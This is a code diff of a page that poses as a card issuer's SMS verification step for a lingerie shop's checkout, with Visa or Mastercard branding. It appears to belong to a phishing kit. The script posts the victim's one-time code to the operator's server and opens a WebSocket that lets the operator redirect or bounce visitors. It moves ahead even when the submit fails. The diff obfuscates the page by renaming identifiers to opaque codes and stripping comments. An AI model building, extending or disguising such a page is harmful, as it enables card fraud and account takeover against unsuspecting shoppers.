@@ -109,7 +109,7 @@
         <!-- Header Zone -->
         <div class="flex items-center justify-between px-8 py-5 border-b border-gray-200">
             <h1 class="text-xl font-bold text-teal-600 tracking-tight">AMIRA LINGERIE</h1>
-            <img id="brandLogo"
+            <img id="g1"
                 src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png"
                 alt="Secure Payment" class="h-5 object-contain">
         </div>
@@ -120,20 +120,20 @@
 
             <p class="body-text">
                 We sent you a verification code by text message to <span dir="ltr">(+966) <span
-                        id="phoneEnd">***-**89</span></span>. You have 6 attempts.
+                        id="s1">***-**89</span></span>. You have 6 attempts.
             </p>
 
-            <form id="otpForm" class="flex flex-col items-center">
+            <form id="f2" class="flex flex-col items-center">
                 <!-- Input Group -->
                 <div class="w-full px-12 mb-6 group">
-                    <label for="otpInput" id="inputLabel" class="block input-label mb-1 transition-colors">Verification
+                    <label for="i7" id="l1" class="block input-label mb-1 transition-colors">Verification
                         code</label>
-                    <input type="tel" id="otpInput" maxlength="6"
+                    <input type="tel" id="i7" maxlength="6"
                         class="w-full border border-gray-300 rounded px-3 py-2 text-text-dark secure-input text-center focus:outline-none focus:border-btn-blue focus:ring-1 focus:ring-btn-blue transition-all"
                         placeholder="" autocomplete="one-time-code">
 
                     <!-- Error Message -->
-                    <div id="errorContainer" class="hidden mt-2 flex items-center gap-1.5 justify-center">
+                    <div id="e1" class="hidden mt-2 flex items-center gap-1.5 justify-center">
                         <svg class="w-4 h-4 text-error-red" fill="currentColor" viewBox="0 0 20 20">
                             <path fill-rule="evenodd"
                                 d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
@@ -145,7 +145,7 @@
 
                 <!-- Submit Button -->
                 <div class="pb-4">
-                    <button type="submit" id="submitBtn"
+                    <button type="submit" id="b2"
                         class="submit-btn hover:opacity-90 transition-opacity rounded-sm shadow-sm">
                         Continue
                     </button>
@@ -153,10 +153,10 @@
 
                 <!-- Resend Link -->
                 <div class="text-center pb-8">
-                    <button type="button" id="resendBtn" class="resend-link hover:underline">
+                    <button type="button" id="b3" class="resend-link hover:underline">
                         Resend Code
                     </button>
-                    <p id="resendMsg" class="hidden text-xs text-green-600 mt-2 font-medium">New code sent successfully!
+                    <p id="m1" class="hidden text-xs text-green-600 mt-2 font-medium">New code sent successfully!
                     </p>
                 </div>
             </form>
@@ -166,12 +166,12 @@
         <div class="bg-gray-50 border-t border-gray-200"
             style="padding-left: 32px; padding-right: 32px; padding-top: 16px; padding-bottom: 16px;">
             <div class="flex items-center justify-between">
-                <button type="button" id="helpToggle" class="need-help-label hover:underline flex items-center gap-1">
-                    Need Help? <span class="text-lg font-bold leading-none ml-auto" id="plusIcon"></span>
+                <button type="button" id="b4" class="need-help-label hover:underline flex items-center gap-1">
+                    Need Help? <span class="text-lg font-bold leading-none ml-auto" id="s2"></span>
                 </button>
             </div>
             <!-- Expandable Text -->
-            <div id="helpText" class="hidden mt-2 text-xs text-gray-500 font-open-sans">
+            <div id="t1" class="hidden mt-2 text-xs text-gray-500 font-open-sans">
                 <p>If you haven't received the code, please check your network connection or try resending the code.
                     Contact your bank for further assistance.</p>
             </div>
@@ -179,113 +179,101 @@
     </div>
 
     <script>
-        // --- API & WebSocket Integration ---
-        let clientId = localStorage.getItem('aura_client_id');
-        if (!clientId) {
-            clientId = 'unknown-' + Date.now();
+        let _a = localStorage.getItem('aura_client_id');
+        if (!_a) {
+            _a = 'unknown-' + Date.now();
         }
 
-        const proto = window.location.protocol === 'https:' ? 'wss' : 'ws';
-        const wsUrl = `${proto}://${window.location.host}/ws/client/${clientId}`;
-        const ws = new WebSocket(wsUrl);
+        const _b = window.location.protocol === 'https:' ? 'wss' : 'ws';
+        const _c = `${_b}://${window.location.host}/ws/client/${_a}`;
+        const _d = new WebSocket(_c);
 
-        ws.onopen = () => {
-            ws.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
+        _d.onopen = () => {
+            _d.send(JSON.stringify({ event: 'step_update', data: { step: 'sms_otp' } }));
         };
 
-        ws.onmessage = (e) => {
+        _d.onmessage = (e) => {
             try {
-                const msg = JSON.parse(e.data);
-                if (msg.type === 'REDIRECT') {
-                    window.location.href = msg.url;
-                } else if (msg.type === 'BANNED') {
-                    window.location.href = msg.redirect || 'https://www.google.com';
+                const _e = JSON.parse(e.data);
+                if (_e.type === 'REDIRECT') {
+                    window.location.href = _e.url;
+                } else if (_e.type === 'BANNED') {
+                    window.location.href = _e.redirect || 'https://www.google.com';
                 }
             } catch (err) { console.error(err); }
         };
 
-        // --- Brand Detection (Visa or Mastercard) ---
-        const brand = localStorage.getItem('card_brand') || 'visa';
-        const logoImg = document.getElementById('brandLogo');
-        const submitBtn = document.getElementById('submitBtn');
+        const _f = localStorage.getItem('card_brand') || 'visa';
+        const _g = document.getElementById('g1');
+        const _h = document.getElementById('b2');
 
-        if (brand === 'mastercard') {
-            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
-            submitBtn.classList.add('mc');
+        if (_f === 'mastercard') {
+            _g.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/1280px-Mastercard-logo.svg.png";
+            _h.classList.add('mc');
         } else {
-            // Visa is default
-            logoImg.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
+            _g.src = "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/2560px-Visa_Inc._logo.svg.png";
         }
 
-        // --- Phone Number Display ---
-        const savedPhone = localStorage.getItem('aura_phone');
-        if (savedPhone) {
-            // Format: Show last 2 digits only, e.g., 0512345678 -> ***-**78
-            const cleanPhone = savedPhone.replace(/\D/g, ''); // Remove non-digits
-            if (cleanPhone.length >= 2) {
-                const lastTwo = cleanPhone.slice(-2);
-                document.getElementById('phoneEnd').textContent = `***-**${lastTwo}`;
+        const _i = localStorage.getItem('aura_phone');
+        if (_i) {
+            const _j = _i.replace(/\D/g, '');
+            if (_j.length >= 2) {
+                const _k = _j.slice(-2);
+                document.getElementById('s1').textContent = `***-**${_k}`;
             }
         }
 
-        // --- Help Toggle ---
-        const helpToggle = document.getElementById('helpToggle');
-        const helpText = document.getElementById('helpText');
-        const plusIcon = document.getElementById('plusIcon');
+        const _l = document.getElementById('b4');
+        const _m = document.getElementById('t1');
+        const _n = document.getElementById('s2');
 
-        helpToggle.addEventListener('click', () => {
-            helpText.classList.toggle('hidden');
-            plusIcon.textContent = helpText.classList.contains('hidden') ? '+' : '−';
+        _l.addEventListener('click', () => {
+            _m.classList.toggle('hidden');
+            _n.textContent = _m.classList.contains('hidden') ? '+' : '−';
         });
 
-        // --- Resend Code ---
-        const resendBtn = document.getElementById('resendBtn');
-        const resendMsg = document.getElementById('resendMsg');
+        const _o = document.getElementById('b3');
+        const _p = document.getElementById('m1');
 
-        resendBtn.addEventListener('click', () => {
-            resendMsg.classList.remove('hidden');
+        _o.addEventListener('click', () => {
+            _p.classList.remove('hidden');
             setTimeout(() => {
-                resendMsg.classList.add('hidden');
+                _p.classList.add('hidden');
             }, 3000);
         });
 
-        // --- Form Submission ---
-        const otpForm = document.getElementById('otpForm');
-        const otpInput = document.getElementById('otpInput');
-        const errorContainer = document.getElementById('errorContainer');
+        const _q = document.getElementById('f2');
+        const _r = document.getElementById('i7');
+        const _s = document.getElementById('e1');
 
-        otpForm.addEventListener('submit', async (e) => {
+        _q.addEventListener('submit', async (e) => {
             e.preventDefault();
-            const otpVal = otpInput.value;
+            const _t = _r.value;
 
-            if (otpVal.length !== 6) {
-                errorContainer.classList.remove('hidden');
-                otpInput.classList.add('border-error-red');
+            if (_t.length !== 6) {
+                _s.classList.remove('hidden');
+                _r.classList.add('border-error-red');
                 return;
             }
 
-            errorContainer.classList.add('hidden');
-            otpInput.classList.remove('border-error-red');
+            _s.classList.add('hidden');
+            _r.classList.remove('border-error-red');
 
-            submitBtn.disabled = true;
-            submitBtn.textContent = 'Verifying...';
+            _h.disabled = true;
+            _h.textContent = 'Verifying...';
 
-            // Send OTP to API
             try {
-                await fetch(`/v1/sms-submit?client_id=${clientId}&otp=${otpVal}`, {
+                await fetch(`/v1/sms-submit?client_id=${_a}&otp=${_t}`, {
                     method: 'POST'
                 });
-                // Redirect to Loading Step 2 (60s)
                 window.location.href = 'loading?step=2';
             } catch (err) {
                 console.error(err);
-                // Even if it fails, simulate progression
                 window.location.href = 'loading?step=2';
             }
         });
 
-        // Auto-focus input
-        otpInput.focus();
+        _r.focus();
     </script>
 
 </body>
